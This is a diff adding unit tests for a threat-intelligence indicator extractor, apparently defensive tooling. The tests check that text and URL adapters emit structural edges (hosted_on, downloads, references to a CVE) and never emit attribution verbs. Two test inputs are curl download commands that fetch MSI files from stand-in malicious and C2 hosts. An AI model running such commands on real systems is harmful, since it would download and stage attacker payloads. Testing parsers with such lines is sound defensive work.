@@ -120,3 +120,52 @@ def test_downstream_engine_reads_artifacts_only():
     # Values include canonicalised registry
     regs = iep.values_of("registry_key")
     assert any(r.startswith("HKEY_LOCAL_MACHINE\\") for r in regs)
+
+
+# ─── R8 · discover_relationships — structural edges only ───────────────
+def test_text_adapter_emits_url_hosted_on_domain():
+    iep = TextAdapter().make_iep("Visit https://mal.example/path\n")
+    verbs = {(r.verb, r.to_ref) for r in iep.relationships}
+    assert ("hosted_on", "mal.example") in verbs
+
+
+def test_text_adapter_emits_command_downloads_url_on_same_line():
+    iep = TextAdapter().make_iep(
+        "curl.exe -o C:\\ProgramData\\a.msi https://mal.example/a.msi\n"
+    )
+    dl = [r for r in iep.relationships if r.verb == "downloads"]
+    assert dl, "expected at least one `downloads` edge"
+    assert any("https://mal.example/a.msi" in r.to_ref for r in dl)
+
+
+def test_url_adapter_emits_article_references_cve(monkeypatch):
+    def fake_acquire(url, **kw):
+        from types import SimpleNamespace
+        return SimpleNamespace(
+            to_dict=lambda: {
+                "article_text": "The report discusses CVE-2024-57727 in detail.",
+                "structured_blocks": [],
+                "engine":   "trafilatura",
+                "sitename": "example",
+                "title":    "T",
+            }
+        )
+    monkeypatch.setattr("services.ida.acquisition.acquire_url",
+                        fake_acquire, raising=False)
+    iep = URLAdapter().make_iep("https://x.example/y")
+    refs = [r for r in iep.relationships if r.verb == "references"]
+    assert any("CVE-2024-57727" in (r.to_ref or "") for r in refs), \
+        f"expected references→CVE-2024-57727, got {iep.relationships!r}"
+
+
+def test_r8_adapters_never_emit_reasoning_verbs():
+    """R8 · adapters may only emit structural verbs. No `attributed`
+    intent, no malware behaviour, no attack-chain reasoning."""
+    iep_text = TextAdapter().make_iep(
+        "curl.exe -o x.msi https://c2.example/x.msi\n"
+    )
+    _FORBIDDEN = {"is_malicious", "represents", "achieves",
+                  "indicates_intent", "belongs_to_family"}
+    for r in iep_text.relationships:
+        assert r.verb not in _FORBIDDEN, \
+            f"adapter emitted reasoning verb: {r.verb}"
